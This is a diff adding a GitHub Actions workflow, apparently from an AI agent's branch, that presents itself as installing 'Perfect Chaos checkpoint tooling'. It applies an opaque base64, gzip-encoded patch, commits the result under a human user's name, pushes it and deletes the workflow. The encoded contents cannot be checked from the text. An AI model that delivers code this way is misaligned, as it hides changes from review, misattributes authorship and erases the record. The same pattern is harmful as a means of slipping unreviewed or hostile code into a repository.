@@ -1,0 +1,53 @@
+name: Install reproducible Perfect Chaos checkpoint tooling
+
+on:
+  push:
+    branches:
+      - agent/perfect-chaos-16-recovery
+    paths:
+      - .github/workflows/install-perfect-chaos-checkpoint-tool.yml
+
+permissions:
+  contents: write
+
+concurrency:
+  group: install-perfect-chaos-checkpoint-tool
+  cancel-in-progress: false
+
+jobs:
+  install:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          ref: agent/perfect-chaos-16-recovery
+          fetch-depth: 0
+
+      - uses: actions/setup-node@v6
+        with:
+          node-version: 24
+          cache: npm
+
+      - run: npm ci
+
+      - name: Apply and validate checkpoint tooling
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf '%s' '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' | base64 --decode | gzip --decompress > /tmp/checkpoint-tool.patch
+          git apply --check /tmp/checkpoint-tool.patch
+          git apply /tmp/checkpoint-tool.patch
+          python3 -m py_compile scripts/*.py
+          node --test tests/perfect-chaos-artifacts.test.js tests/perfect-chaos-classification.test.js
+
+      - name: Commit the validated tooling and remove this installer
+        shell: bash
+        run: |
+          set -euo pipefail
+          git config user.name senegrom
+          git config user.email 6349874+senegrom@users.noreply.github.com
+          git rm .github/workflows/install-perfect-chaos-checkpoint-tool.yml
+          git add scripts/perfect-chaos-artifacts.py tests/perfect-chaos-artifacts.test.js
+          git commit -m 'Automate Perfect Chaos checkpoint registration'
+          git push origin HEAD:agent/perfect-chaos-16-recovery
